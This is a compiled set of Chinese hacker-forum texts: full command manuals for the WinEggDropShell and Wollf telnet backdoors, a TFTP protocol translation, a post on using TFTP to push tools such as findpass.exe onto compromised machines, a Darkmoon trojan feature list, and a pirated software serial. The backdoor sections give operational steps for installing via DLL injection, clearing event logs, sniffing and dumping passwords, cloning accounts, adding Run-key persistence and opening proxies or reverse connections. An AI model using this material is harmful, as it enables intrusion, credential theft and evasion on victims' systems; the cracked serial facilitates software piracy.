6.WhoIsShell 功能说明:列出哪个IP得到一个shell
7.ShowName 功能说明:显示所有系统帐户(通过读注册表,可以显示到隐藏帐户)
8.Reboot 功能说明:重启那台系统
9.ShutDown 功能说明:关闭那台系统
10.Logoff 功能说明:注销登陆了的帐户
11.PowerOff 功能说明:关那系统电源
12.Shell 功能说明:得到一个Shell
13.Stopbackdoor 功能说明:停止wineggdropshell服务
14.pskill 功能说明:杀进程
15.Never 功能说明:设置某个帐户使其的登陆时间被改为从
无登陆以及登录次数为0.
16.DirFile 功能说明:显示当前目录文件
17.DelFile 功能说明:删除文件
18.Execute 功能说明:执行程序
19.Http://IP/文件 功能说明:下载文件
20.Installterm 功能说明:安装终端服务
21.Clone 功能说明:克隆一个系统帐户
22.Send 功能说明:给其它连接上wineggdropshell的用户发信息
23.Exit 功能说明:断开连接
24.OffShell 功能说明:将得到Shell的用户踢下去
25.Help 功能说明:显示命令说明
26.Disconnect 功能说明:将其它用户踢下线去
27.StopService 功能说明:停止系统的某个服务
28.StartService 功能说明:启动系统某个服务
29.DeleteService 功能说明:删除系统某个服务
30.CleanEvent 功能说明:清除系统日志
31.TerminalPort 功能说明:查看或重新设置终端服务端口
32.Redirect 功能说明:TCP数据转发
33.ViewThreads 功能说明:查看TCP数据转发打开的线程
34.KillThreads 功能说明:杀掉某个TCP数据转发的线程
35.EnableFilter 功能说明:激活TCP/IP过滤
36.DisableFilter 功能说明:禁止TCP/IP过滤
37.FilterInfo 功能说明:查看TCP/IP过滤是处于激活还是禁止状态
38.AR 功能说明:恢复系统几个常用的关联的设置
39.GetUser 功能说明:列举系统所有帐户
40.ViewPath 功能说明:查看当前目录
41.SetPath 功能说明:设置当前目录
42.SID 功能说明:查看本地或远程系统帐户的SID
43.ViewTimeOut 功能说明:查看超时秒数
44.SetTimeOut 功能说明:设置超时秒数
45.StartSniffer 功能说明:启动嗅觉密码功能
46.StopSniffer 功能说明:停止嗅觉功能
47.ViewSniffer 功能说明:查看嗅觉密码功能是否在进行
48.Sysinfo 功能说明:查看系统的信息
49.ViewService 功能说明:查看某个服务的状态
50.ConfigService 功能说明:修改某个服务的启动状态
51.ViewKey 功能说明:查看run和runservices所有的项
52.DelKey 功能说明:删除run和runservices中的一个启动项
53.EnumService 功能说明:列举所有自动启动的服务的资料
54.RegEedit 功能说明:进入注册表操作模式
55.Findpassword 功能说明:得到所有当前登陆上系统的用户的密码
56.ExitShell 功能说明:在cmd的shell下返回到[Melody]模式
57.StartProxy 功能说明:启动Sock5代理
58.StopProxy 功能说明:停止Sock5代理
59.ViewProxyInfo 功能说明:查看Sock5代理信息


在使用程序前先看下面的说明:
1.先配置好InjectT.exe,然后将InjectT.exe和那个TBack.Dll上载到其它系统的winnt\system32下，
然后执行
InjectT.exe -run (安装为服务并且执行)


以下命令是当你用Telnet连接上WinEggDropShell后门并成功通过验证到达[Melody]模式使用的命令:
V1.50命令如下
1.pslist 功能：显示系统进程
用法:pslist

2.ListIP 功能:显示系统所有IP(外部，内部IP和电脑名等)
用法:ListIP

3.ShowSID 功能:显示系统帐户的SID
用法:ShowSID

4.ShowName 功能:显示系统所有帐户(不同于getuser,可以得到一些"隐藏"的帐户)
用法:ShowName

5.Fport 功能:进程到端口列表
用法:Fport

6.Online 功能:显示连接上wineggdropshell的用户的IP以及使用的Thread
用法:Online

7.WhoIsShell 功能:显示哪个IP正在使用Shell
用法:WhoIsShell

8.Reboot 功能:重启系统
用法:Reboot

9.ShutDown 功能:关闭系统
用法:ShutDown

10.Logoff 功能:注销登陆了的系统用户
用法:Logoff

11.PowerOff 功能:关闭电源
用法:PowerOff

12.Shell 功能:得到一个Cmd Shell
用法:Shell

13.Stopbackdoor 功能:停止WinEggDropShell服务(此功能在V1.38版本被禁止)
用法:Stopbackdoor

14.Help 功能:显示所有命令帮助
用法:Help 

15.Exit 功能:断开连接
用法:Exit

16.Pskill PID或程序名 功能:杀进程
用法:pskill 1234
用法:pskill notepad

17.Never 用户名 功能:更改某个用户的设定，使它的登陆次数变为0以及从没有登陆上系统
用法:Never Guest
用法:Never Administrator

18.DirFile 文件名 功能:显示当前目录的文件，支持通配符
用法:DirFile *.exe

19.DelFile 文件名 功能:删除当前目录的一个文件,不支持通配符
用法: DelFile a.txt

20.Execute 程序 功能:在后台中执行程序
用法:Execute abc.exe
用法:Execute net.exe user test test
注意:要执行的程序要加扩展名，否则可能不会执行成功.

21.http://ip/文件名 保存文件名 功能:下载程序
用法:http://11.11.11.11/a.exe a.exe
用法:http://www.mysite.com/a.exe a.exe

22.Installterm 端口 功能:在没有安装终端服务的win 2k服务版的系统中安装终端服务，重启系统后才生效.
用法:Installterm 3345 (重启后终端会打开3345那个端口,使用此命令前先看看你要定义的终端的端口是否被
其它程序所用)

23.Clone 帐户 要克隆的帐户 密码 功能:克隆一个帐户
用法:Clone Admin Guest test
上面用法会效Guest克隆到Admin那个用户中，并且Guest的密码被改为test

24.Send All 信息 功能:给其它登陆上wineggdropshell的用户发信息
用法:Send all 你好

25.OffShell 功能:将得到Shell的用户踢下去
用法:OffShell

26.Disconnect 功能:将其它用户(不管是否是得到shell)踢下线
用法:Disconnect ThreadNumber ->将某个用户踢下去
用法:Disconnect All ->将所有用户踢下去，除你自己外
注意:如何得到ThreadNumber呢?如果你使用Online这个命令(上面命令列表的第6个命令),你就可以得到
所有登陆了的用户的ThreadNumber.

27.StopService 功能:停止系统的某个服务
用法:StopService 服务名
例子:StopService w3svc(将IIS服务停止)

28.StartService 功能:启动系统某个服务
用法:StartService 服务名
例子:StartService w3svc(启动IIS服务)

29.DeleteService 功能:删除系统某个服务
用法:DeleteService 服务名
注意:一般在删除一个服务前要要将那个服务停止的，但因为有些服务对net stop是没有响应的，所以
只能是直接删除。当强行将一个正在运行的服务删除，服务还是在运行的，所以建议先使用stopservice
将服务停止，如果不能停止，那就另当别论.

30.CleanEvent 功能:删除系统日志
用法:CleanEvent
会将系统的Application,Security以及System的日志全部删除

31.TerminalPort 功能:查看终端服务端口
用法:TerminalPort 

32.TerminalPort 新的端口 功能:重新设置终端服务端口
用法:TerminalPort 新的端口
注意:新端口必须是合法的端口,否则程序会返回错误。

33.Redirect 功能说明:TCP数据转发
用法:Redirect 端口 远程系统IP 远程端口
例子:Redirect 2222 12.12.12.12 3333 (这样任何连接到肉机2222端口的TCP数据都会转发到
12.12.12.12这个IP的端口3333中去)
例子:Redirect 2222 www.abc.com 3333 (这样任何连接到肉机2222端口的TCP数据都会转发到
www.abc.com的端口3333中去)

34.ViewThreads 功能说明:查看TCP数据转发打开的线程
用法:ViewThreads 

35.KillThreads 功能说明:杀掉某个TCP数据转发的线程
用法:KillThreads 线程号
注:这里的线程号是通过用ViewThreads看到的

36.EnableFilter 功能说明:激活TCP/IP过滤
用法:EnableFilter

37.DisableFilter 功能说明:禁止TCP/IP过滤
用法:DisableFilter

38.FilterInfo 功能说明:查看TCP/IP过滤是处于激活还是禁止状态
用法:FilterInfo

39.AR 功能说明:恢复系统几个常用的关联的设置
用法:AR

40.GetUser 功能说明:列举系统所有帐户
用法:GetUser

41.ViewPath 功能说明:查看当前目录
用法:ViewPath

42.SetPath 功能说明:设置当前目录
用法:SetPath 目录

43.SID 功能说明:查看本地或远程系统帐户的SID
用法:SID Local|IP
例子:SID Local (查看本地帐户的SID)
例子:SID IP (查看远程IP的帐户的SID,只有允许空连接，当会成功看到)

44.ViewTimeOut 功能说明:查看超时秒数
用法:ViewTimeOut

45.SetTimeOut 功能说明:设置超时秒数
用法:SetTimeOut 秒数

46.StartSniffer 功能说明:启动嗅觉密码功能
用法:StartSniffer NIC
例子:StartSniffer 0
注意:这里的NIC是网卡的号，很多系统有几个网卡的，所以你要有选择地选网卡进行
嗅觉，使用ListIP功能可以看到网卡对应的IP以及网卡号.结果会保存到Sniffer.dll
中去

47.StopSniffer 功能说明:停止嗅觉功能
用法:StopSniffer

48.ViewSniffer 功能说明:查看嗅觉密码功能是否在进行
用法:ViewSniffer

49.Sysinfo 功能说明:查看系统的信息
用法:Sysinfo

50.ViewService 功能说明:查看某个服务的状态
用法:ViewService ServiceName
例子:ViewService Norton Antivirus Server

51.ConfigService 功能说明:修改某个服务的启动状态
用法:ConfigService StartType ServiceName
例子:ConfigService Auto W3svc -->将IIS服务启动状态改为自动
例子:ConfigService Demand w3svc -->将IIS服务启动状态改为手动
例子:ConfigService Disable w3svc -->将IIS服务启动状态改为禁止
注意:上面参数中的StartType只可以是Auto,Demand,Disable中的其中一种，Auto代表自动，
Demand代表手动以及Disable代表禁止.

52.ViewKey 功能说明:查看run和runservices所有的项
用法:ViewKey

54.DelKey 功能说明:删除run和runservices中的一个启动项
用法:DelKey KeyName
例子1: DelKey radmm
例子2: DelKey Tk BellExe

53.EnumService 功能说明:列举所有自动启动的服务的资料
用法:EnumService

55.RegEdit 功能说明:进入注册表操作模式
用法:RegEdit
注意:如果你对于注册表并不熟悉(例如对注册表结构，数据类型等没有一个大概的认识的话，最
好就不要使用这个功能，特别是删除键或键值的功能。注册表中的数据是每重要的，修改
或删除一些重要的数据的话，很容易导致系统无法加载的，特别是后门是以服务启动的，
这样给了用户可以操作sam下数据的能力，所以不要乱用删除功能。
当输入RegEdit后，后门会从进入注册表的操作模式，你如果输入Help的话，会看到很多命令，这
些命令是当进入注册表操作模式后能起作用的，这些命令如下:

DirValue 功能说明:列出当前键下的所有项

DirKey 功能说明:列出当前的所有键

CD.. 功能说明:向后退一个键
例子:你现在是在hklm\software\microsoft下的话，输入cd..，那么当前你在注册表的位置就
会转到hklm\software下了。

Root 功能说明:退出注册表的根下
例子:无论你在注册表那个位置，输入root就会返回到hklm下

Exit 功能说明:退出注册表模式

Help 功能说明:输出帮助

CD KeyName 功能说明:进入某个键中去
例子:假设你正在在注册表中的hklm\software下，你输入cd microsoft,那么就会下入到hklm\software\microsoft
中去。

DelValue ValueName 功能说明:删除一个键值
例子:假设你是在hklm\software\microsoft下，这个键下有一项值是test,你输入
DelValue test,就会将test这个键值删除

DelKey KeyName 功能说明:删除一个键
例子:假设你在hklm\software\microsoft下，这个键下有一个键叫abc,你输入
DelKey abc,就会将abc整个键删除。(小心使用这个功能，因为会将整个键
删除，那个键下的键以及键值都会被删除)

Set Type ValueName Value 功能说明:增加一个键值
例子:假设你在hklm\software\microsoft\windows\currentversion\run下，你输入
Set REG_SZ test hook.exe,这样就会在run下生成一个test的键值，键值执行的程序是
hook.exe.
注意:这里的Type常用的只有几种，REG_SZ,REG_DWORD,REG_MUL_SZ,EG_EXPAND_SZ,当中以REG_SZ
最为常用。

55.Findpassword 功能说明:得到所有登陆用户的密码
用法:Findpassword

56.ExitShell 功能说明:在cmd的shell下返回到[Melody]模式
用法:ExitShell
注意:这命令是当用户得到一个cmd下的shell后，想退回到[Melody]那里去使用后门的命令时才使用.

57.StartProxy 功能说明:启动Sock5代理
用法: StartProxy [UserName] [Password] Port AllowedIP
说明: 
A.参数中的[UserName]和[Password]是可选项，如果没有的话，那就是无密码验证。
B.Port是代理打开的端口
C.AllowedIP是哪些IP是允许连接代理的，如果所有IP都可以连接，参数为All.
例子1: StartProxy 12345 All -->代理端口为12345,没有密码验证，所有IP都可以连
例子2: StartProxy Guest test 12345 All -->代理端口为12345,有密码验证，所有IP都可以连
例子3: StartProxy 12345 211.11.*.* -->代理端口为12345,没有密码验证，只有以211.11开头的IP可以连上代理。
例子4: StartProxy Abc abc 12345 12.12.*.* -->代理端口为12345,有密码验证，只有12.12开头的IP可以连上代理

58.StopProxy 功能说明:停止Sock5代理
用法: StopProxy
注意:当系统是NT 4.0时，使用此命令时会返回"Fail To Stop UDP Thread"的信息，其实是成功停
止了的，只是因为NT 4.0本身对某个API的返回的问题，所以会出现这个错误信息，但在win 2k
或xp是没有问题的。

59.ViewProxyInfo 功能说明:查看Sock5代理信息
用法:ViewProxyInfo


有必要加以说明的功能:
1.ExitShell
此功能主要是用于当用户成功得到一个Cmd下的shell后，想回到[Melody]模式下去继续使用命令
，就可以使用ExitShell直接切换会[Melody]模式，这样就方便用户不需要直接断开，然后再连
接上后门才可以到达[Melody]模式。

2.Cmd Redirector
此功能主要是方便用户在[Melody]模式下想运行一些系统本身命令或外部命令，但又不想直接进
入到cmd的shell所设，例如用户在[Melody]模式下想查看系统帐户Guest的一些信息，用户可以
直接在[Melody]模式下直接输入net user Guest,然后就可以看到Guest用户的信息了，当然用
户也可以直接进入到shell模式下去运行上面的命令。此功能基本上可以理解为一个模拟的Shell
,所不同的只是不需要多设置一个写的管道，而且因为后门程序只允许一个用户得到cmd下的Shell,
所以增加了这功能可以方便其他无法得到shell的用户使用此功能去得到一个模拟的Shell.

3.Sock5代理
Sock5代理是支持无密码和密码验证两种方式的，但由于局部网本身的限制问题，不借助第三方
程序是无法在udp协议的应用程序(oicq或其它在线游戏等)上使用sock5代理的，并且因为skservergui
那程序不支持我这个代理，所以暂时在局部网内用户在oicq等上要使用这个代理是有问题的，但
tcp协议的程序(icq,msn,yahoo messnger,irc等)是没有问题的,如果你使用这代理无法在局部网
上oicq的话，请不要问我为什么，上面的话已说得非常清楚了，如果不明白为什么udp协议的应用
程序在局部网内不借助第三方程序无法使用sock5代理连接，请自己查找有关udp协议和局部网相
关的资料查看。



【telnet木马WinEggDrop Shell 极终版木马端配置说明书】
EditServer.exe是一个命令行程序，如下说明是如何配置你的后门程序.

1.将EditServer.exe和在同一个压缩包内的InjectT.exe解压到
同一个目录在.
2.在命令行下执行editserver.exe InjectT.exe,然后就会看到
配置的信息，你至少要配置其中一个，例如配置服务名或密码等。

设置程序的信息只有密码是加过密的，不是用什么复杂的算法加密的，所以如果的话
，先配置后再压缩。如果真不行的话再压缩后再配置。

这一版必须使用压缩包内的EditServer.exe进行配置，其它版本的EditServer.exe不会兼容
这一版的设置。

下面问题在使用前一定要看:
1.服务名，服务显示名以及服务描述都不能超过64个字符长.
2.密码不能超过32个字符长
3.如果没有设置密码的话，那么默认密码是wineggdropshell
4.如果设置服务名的话，那么默认服务名是Windows Internet Services
5.如果没有设置端口的话，那么默认的端口为12345
6.如果没有设置将后门的DLL插到那个进程中去的话，默认是插到Explorer.exe中去
7.如果没有设置InjectT.exe将哪个DLL插入到进程中去的话，InjectT.exe会默认将TBack.Dll插
到其它进程。
8.如果你将TBack.Dll改名了，那么你一定要设置配置中的第8项(设置要注入的DLL的名字),如果
你将TBack.Dll改名了，但在配置InjectT.exe时又没有设置第8项，那么InjectT.exe就会找
不到后门的DLL文件去插到其它进程。
9.设置配置中的第8项(设置要注入的DLL的名字)时，如果你将TBack.Dll改名为Abc.DLL,那么
你就要输入Abc.DLL
10.如果你想配置第9项(设置要注入DLL的进程名字)，例如你想将后门DLL注入到Svchost中去，
那么你就应该输入svchost.exe
11.你可以将InjectT.exe改名再上传的。
12.如果你将DLL插到一些系统重要的进程，例如winlogon,lsass等的话，请不会使用命令stopbackdoor
,因为这样做会令系统重启或崩溃。
13.如果修改配置的话，例如端口，密码等，你可以再配置一个InjectT.exe,然后将肉机中的
InjectT.exe删除，然后上载这个新配置的，重启就会生效。
14.升级后门的设置很简单的，你只要将新配置的Injectt.exe上传替换掉旧的，重启后新的配置就
会生效。
15.确定后门DLL要插入的那个进程系统是存在的，例如你将插入的进程设置为notepad.exe,那么
如果那系统没打开记事本(Notepad.exe),后门是无法加载到的。
16.InjectT.exe生成的服务在成功加载完后门到其它进程后就会自己停止，所以不要问为什么
那个服务会处于停止的状态。InjectT.exe只是一个加载程序，加载完就没有再继续运行的
需要了。

配置完成后，将InjectT.exe和TBack.DLL上载到winnt\system32下，然后运行InjectT.exe -run
,这样就会安装为服务并运行的了。

删除方法:
1.将服务删除，马上重启
2.将服务改为手动，然后重启后服务就不会加载，然后再将服务删除。





【telnet木马Wollf的使用命令】
Wollf remote manager v1.3, for Windows NT/2000, build 2002-01-19
Code by wollf, http://www.xfocus.org

扩展Telnet服务，可传输文件，可反向连接，可通过参数选择随系统启动或作为普通进程启动。

运行参数：
wollf [options]

[options]含义如下：
-install：安装wollf服务，默认参数；
-remove：停止并清除wollf服务；
-debug：调试wollf服务，用于安装失败后查看出错信息；
-once：作为普通进程运行，重启后不自动加载；
-listen [port]：监听指定端口，等待远程连接，主要用于反向连接方式；
-setup：对wollf.exe进行设置，包括监听端口、访问口令或设置为反向连接方式，完成后将生成wollf_new.exe，设置内容及示例见"config_howto.txt"。

运行示例：
"wollf" 安装并启动服务，监听默认端口7614；
"wollf -remove" 停止并卸载服务；
"wollf -debug" 无法安装服务，加-debug参数运行，以便查看失败原因；
"wollf -once" 作为普通进程运行，重新启动后不自动加载，指定监听2000端口；
"wollf -listen 2000" 监听2000端口，等待远程机器主动连接；
"wollf -setup" 对wollf.exe进行配置，并生成wollf_new.exe。

默认监听端口为7614，通过Telnet连接后可输入"help"查看命令列表。可通过"exit"命令断开连接，"quit"命令关闭服务，"remove"命令关闭并卸载服务。
若将wollf服务设置为反向连接方式，需要事先向FTP或HTTP服务器上传一个包含控制者IP地址和监听端口的文本文件，格式为"[IP]:[port]"，如"192.168.1.1:2000"，然后运行"wollf -listen 2000"等待连接。
建议使用nc(NetCat)作为客户端进行连接。命令参数中如有空格必须置于引号对中，如CD "My Documents"。

目前支持以下命令：

DOS 切换到MS-DOS提示符
DIR/LS/LIST 目录/文件列表
CD 进入目录
MD/MKDIR 创建目录
PWD 查看当前目录
COPY/CP 复制目录/文件
DEL/RM 删除目录/文件
REN 重命名文件
MOVE/MV 移动目录/文件
TYPE/CAT 查看文本内容
WGET 从HTTP服务器下载文件
FGET 从FTP服务器下载文件
FPUT 向FTP服务器上传文件
SHELL 通过系统SHELL(cmd.exe)执行命令，如"SHELL DIR"
EXEC/RUN 通过Windows API(WinExec)运行程序
PS 查看进程列表
WS 查看窗口列表
KILL 强行关闭进程
WHO/W 查看当前所有连接者IP
EXPORT 在新端口输出SHELL
TELNET 连接到其他安装本服务的机器
POPMSG 弹出系统对话框
SYSINFO 查看系统基本信息
SHUTDOWN 关闭系统
EXIT 断开当前连接
QUIT 断开所有连接并终止服务
REMOVE 卸载服务
VER/VERSION 版本信息
HELP/H/? 帮助信息



【TFTP协议规范】
TFTP协议
1. 目的

TFTP是一个传输文件的简单协议，它其于UDP协议而实现，但是我们也不能确定有些TFTP协议是基于其它传输协议完成的。此协议设计的时候是进行小文件传输的。因此它不具备通常的FTP的许多功能，它只能从文件服务器上获得或写入文件，不能列出目录，不进行认证，它传输8位数据。传输中有三种模式：netascii，这是8位的ASCII码形式，另一种是octet，这是8位源数据类型；最后一种mail已经不再支持，它将返回的数据直接返回给用户而不是保存为文件。

2. 概况

任何传输起自一个读取或写入文件的请求，这个请求也是连接请求。如果服务器批准此请求，则服务器打开连接，数据以定长512字节传输。每个数据包包括一块数据，服务器发出下一个数据包以前必须得到客户对上一个数据包的确认。如果一个数据包的大小小于512字节，则表示传输结构。如果数据包在传输过程中丢失，发出方会在超时后重新传输最后一个未被确认的数据包。通信的双方都是数据的发出者与接收者，一方传输数据接收应答，另一方发出应答接收数据。大部分的错误会导致连接中断，错误由一个错误的数据包引起。这个包不会被确认，也不会被重新发送，因此另一方无法接收到。如果错误包丢失，则使用超时机制。错误主要是由下面三种情况引起的：不能满足请求，收到的数据包内容错误，而这种错误不能由延时或重发解释，对需要资源的访问丢失（如硬盘满）。TFTP只在一种情况下不中断连接，这种情况是源端口不正确，在这种情况下，指示错误的包会被发送到源机。这个协议限制很多，这是都是为了实现起来比较方便而进行的。

3. 与其它协议的联系

因为TFTP使用UDP，而UDP使用IP，IP可以还使用其它本地通信方法。因此一个TFTP包中会有以下几段：本地媒介头，IP头，数据报头，TFTP头，剩下的就是TFTP数据了。TFTP在IP头中不指定任何数据，但是它使用UDP中的源和目标端口以及包长度域。由TFTP使用的包标记（TID）在这里被用做端口，因此TID必须介于0到65,535之间。对它的初始化我们在后面讨论。TFTP头中包括两上字节的操作码，这个码指出了包的类型下面我们看看大体上的TFTP包格式，相关的内容我们在后面的章节中进行讨论。

---------------------------------------------------
| Local Medium | Internet | Datagram | TFTP |
---------------------------------------------------
图3-1: 包头次序

4. 初始连接

初始连接时候需要发出WRQ（请求写入远程系统）或RRQ（请求读取远程系统），收到一个确定应答，一个确定可以写出的包或应该读取的第一块数据。通常确认包包括要确认的包的包号，每个数据包都与一个块号相对应，块号从1开始而且是连续的。因此对于写入请求的确定是一个比较特殊的情况，因此它的包的包号是0。如果收到的包是一个错误的包，则这个请求被拒绝。创建连接时，通信双方随机选择一个TID，因此是随机选择的，因此两次选择同一个ID的可能性就很小了。每个包包括两个TID，发送者ID和接收者ID。这些ID用于在UDP通信时选择端口，请求主机选择ID的方法上面已经说过了，在第一次请求的时候它会将请求发到TID 69，也就是服务器的69端口上。应答时，服务器使用一个选择好的TID作为源TID，并用上一个包中的TID作为目的ID进行发送。这两个被选择的ID在随后的通信中会被一直使用。下例是一个写入的例子，其中WRQ，ACK和DATA代表写入请求，确认和数据。

1. 主机A向主机B发出WRQ，其中端口为69
2. B机向A机发出ACK，块号为0，包括B和A的TID

此时连接建立，第一个数据包以序列号1从主机开始发出。以后两台主机要保证以开始时确定的TID进行通信。如果源ID与原来确定的ID不一样，这个包会被认识为发送到了错误的地址而被抛弃。错误的包是被发送到正确端口的，但是包本身有错误。设想发送方发出一个请求，这个请求在网络的那个设备中被复制成两个包，接收方先后接收到两个包。接收方会认为为这是两个独立的请求，会返回两个应答。当这两个应答其中之一被接收到时，连接已经建立。第二个应答再到达时，这个包会被抛弃，而不会因为接收到第二个应答包而导致第一个建立的连接失败。

5. TFTP包

TFTP支持五种类型的包，我们在以上已经说明这五种类型的包：

opcode operation
1 Read request (RRQ)
2 Write request (WRQ)
3 Data (DATA)
4 Acknowledgment (ACK)
5 Error (ERROR)

包头中包括了这个包所指定的操作码。


2 bytes    string   1 byte string 1 byte
------------------------------------------------
| Opcode | Filename | 0 | Mode | 0 |
------------------------------------------------

Figure 5-1: RRQ/WRQ包

RRQ和WRQ包（代码分别为1和2）的格式如上所示。文件名是NETASCII码字符，以0结束。 而MODE域包括了字符串"netascii"，"octet"或"mail"，名称不分大小写。接收到NETASCII格式数据的主机必须将数据转换为本地格式。OCTET模式用于传输文件，这种文件在源机上以8位格式存储。假设每个机器都存在一个8位的格式，这样的假设是最一般的。比如DEC-20，这是一种36位机，我们可以假设它是4个8位外加另外4位而构成。如果机器收到OCTET格式文件，返回时必须与原来文件完全一样。在使用MAIL模式时，用户可以在FILE处使用接收人地址，这个地址可以是用户名或用户名@主机的形式，如果是后一种形式，允许主机使用电子邮件传输此文件。如果使用MAIL类型，包必须以WRQ开始，否则它与NETASCII完全一样。我们的讨论建立在发送方和接收方都在相同模式的情况下，但是双方可以以不同的模式进行传输。例如一个机器可以是一台存储服务器，这样一台服务器需要将NETASCII格式转换为自己的格式。另外，我们可以设想DEC-20这种机器，它使用36位字长，用户这边可以使用特殊的机制一次读取36位，而服务器却可以仍然使用8位格式。在这两种情况下，我们看到了两台机器使用不同格式的情况。可以在两台主机间定义其它的传输方式，但是定义要小心，因为这种传输方式不为人知，而且也没有权威机构为其指定名称或定义它的模式。

2 bytes   2 bytes   n bytes
----------------------------------
| Opcode | Block # | Data |
----------------------------------
Figure 5-2: DATA包

数据在数据包中传输，其格式如上图所示。数据包的OP码为3，它还包括有一个数据块号和数据。数据块号域从1开始编码，每个数据块加1，这样接收方可以确定这个包是新数据还是已经接收过的数据。数据域从0字节到512字节。如果数据域是512字节则它不是最后一个包，如果小于512字节则表示这个包是最后一个包。除了ACK和用于中断的包外，其它的包均得到确认。发出新的数据包等于确认上次的包。WRQ和DATA包由ACK或ERROR数据包确认，而RRQ数据包由DATA或ERROR数据包确认。下图即是一个ACK包，操作码为4。其中的包号为要确认的数据包的包号。

2 bytes 2 bytes
---------------------
| Opcode | Block # |
---------------------
Figure 5-3: ACK包

WRQ数据包被ACK数据包确认，WRQ数据包的包号为0。

2 bytes       2 bytes string 1 byte
-----------------------------------------
| Opcode | ErrorCode | ErrMsg | 0 |
-----------------------------------------
Figure 5-4: ERROR包

一个ERROR包，它的操作码是5，它的格式如上所示。此包可以被其它任何类型的包确认。错误码指定错误的类型。错误的值和错误的意义在附录中。错误信息是供程序员使用的。

6. 正常终止

传输的结束由DATA数据标记，其包括0-511个字符。这个包可以被其它数据包确认。接收方在发出对最后数据包的确认后可以断开连接，当然，适当的等待是比较好的，如果最后的确定包丢失可以再次传输。如果发出确认后仍然收到最后数据包，可以确定最后的确认丢失。发送最后一个DATA包的主机必须等待对此包的确认或超时。如果响应是ACK，传输完成。如果发送方超时并不准备重新发送并且接收方有问题或网络有问题时，发送也正常结束。当然实现时也可以是非正常结束，但无论如何连接都将被关闭。

7. 早终结

如果请求不能被满足，或者在传输中发生错误，需要发送ERROR包。这仅是一种传输友好的方式，这种包不会被确认也不会被重新传输，因此这种包可能永远不会被接收到。因此需要用超时来侦测错误。

I. 附录

包头的次序

2 bytes
----------------------------------------------------------
| Local Medium | Internet | Datagram | TFTP Opcode |
----------------------------------------------------------

TFTP格式

Type Op # 没有包头的格式

2 bytes          string 1 byte string 1 byte
-----------------------------------------------
RRQ/ | 01/02 | Filename | 0 | Mode | 0 |
WRQ -----------------------------------------------

2 bytes      2 bytes n bytes
---------------------------------
DATA | 03 | Block # | Data |
---------------------------------

2 bytes    2 bytes
-------------------
ACK | 04 | Block # |
--------------------

2 bytes       2 bytes    string 1 byte
----------------------------------------
ERROR | 05 | ErrorCode | ErrMsg | 0 |
----------------------------------------

读文件的初始连接

1. 主机A发RRQ到A，包括源=A的ID和目的=69
2. 主机B发送DATA，其中包号=1，这个包被传送到A，源=B的ID，目的=A的ID

错误码

Value Meaning

0 未定义，请参阅错误信息（如果提示这种信息的话）
1 文件未找到
2 访问非法
3 磁盘满或超过分配的配额
4 非法的TFTP操作
5 未知的传输ID
6 文件已经存在
7 没有类似的用户

Internet用户数据报头

（TFTP不一定非要在UDP上实现。）

Format

0                   1                   2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Source Port | Destination Port |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Length | Checksum |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

域的值

Source Port 由传输发起方选择
Dest. Port 由目的地选择（如果是RRQ或WRQ，其值为69）
Length 包括UDP包头的包长度
Checksum 校验码，如果是0，则未使用校验

注意：TFTP将传输标记TID传送给UDP作为源和目的端口

安全问题

因为TFTP没有安全控制机制，因此安全问题应该多加考虑。通常TFTP允许下载数据而不允许上传数据。
 


【TFTP的使用方法】
TFTP的使用方法
c酱ギ紫q 发表于 2005-3-3 20:08:04  
　 
入侵的时候，我们经常要上传一些软件，我们可以采取多种方式上传，比如ftp。但是经常使用的一种
简单方便的方法就是使用tftp来传输文件。TFTP（Trivial File Transfer Protocol,简单文件传输协议）
是TCP/IP协议族中的一个用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的
文件传输服务。TFTP承载在UDP上，使用UDP 67端口，提供不可靠的数据流传输服务，不提供存取授权与认
证机制，使用超时重传方式来保证数据的到达。与FTP相比，TFTP的大小要小的多。
   首先，我们要先在自己的机上运行tftp服务器，这里推荐使用aftp，它比大家常用的tftpd32好多了，因
为它可以方便的设置文件的目录和显示传输速率和进度，这样我们就可以随时了解进程。
   当你第一次使用时，先进行一些设置，主要是超时时间，最大连接要设置大一些，文件夹选择你的软件存
放的目录，一般把aftp放到你的软件的当前目录，这里的“."就表示当前目录。其他设置默认就可以了。
   其次，tftp的用法
一、上传： 
格式：tftp -i 你的IP get 要上传文件 存放位置(可以省略)
比如tftp -i 202.116.191.200 get findpass.exe 
二、下载： 
格式：tftp -i 你的IP put 要下载文件 存放位置(可以省略)
比如tftp -i 202.116.191.200 put good.rar

注意点： 
1、tftp在运行中不得断开连接。 
2、文件的默认存放位置就是tftp目录。 
3、可以在任何对方的命令行使用tftp，如：跟在对方IP后的浏览器地址栏里（详细说明请参考U 
漏洞的贴子）、SQLEXEC的command输入行等等位置。 
4、tftp默认属性是上传和下载的时候采用覆盖不提示的方式。 
5、tftp上传的文件可能会加上只读属性，请上传完全毕后检阅
 
 


【tool】
Darkmoon 4.11 final(最终版) 
作者:Darkmoon 
汉化by:x140d4n 
功能： 
常规的 服务器控制，如 关机、重启 == 
进程管理 
桌面控制&捕捉 
摄像头监视 
窗口管理 
远程Shell 
密码.... 
注册表 
恶作剧 
键盘记录 
系统管理 
服务器管理 
系统信息 
文件管理 
上下传 
支持在线编辑服务端 



国外木马，功能还可能。
可开ftp服务和http代理
启动方式：支持自定义注册表项启动和Activex方式启动
通知IP方式：udp，icq，email，script（php,cgi……），sin
可禁止某个程序进程运行和隐藏某个程序进程（rootkit）
有捆绑功能和自定义服务端图标！
还可以改对方的声音大小，捕捉摄像头图像！
还有一些有趣的功能！大家自己发掘吧

服务端： 609.280 bytes

注册表启动项:


PCBoost 可以安全高效的增强你的系统性能达100%以上!您的电脑常常当机吗？开机非常龟速吗？有私人档案需要作保护吗？PCBoost 正是您所需要的软体！2 分钟内帮您完成系统自动加速；当然，也可以手动个别设定调整，包括桌面、开始功能表、网路、硬体、光碟机、记忆体、关机的优化。
  
 注册信息：
 用户名：www.5icrack.com
 序列号：56696549447937056+2+UCF21
 注册时请用防火墙拦截软件要求连接到网络的请求!^_^ 

